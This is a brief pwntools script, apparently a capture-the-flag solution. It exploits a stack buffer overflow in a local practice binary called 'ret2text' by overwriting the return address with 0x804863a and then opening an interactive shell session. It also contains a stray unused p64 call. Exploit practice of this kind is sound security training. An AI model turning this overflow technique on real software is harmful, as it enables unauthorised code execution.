from pwn import *

sh = process('./ret2text')
target = 0x804863a
p64(target)
sh.sendline(b'A' * (0x6c+4) + p32(target))
sh.interactive()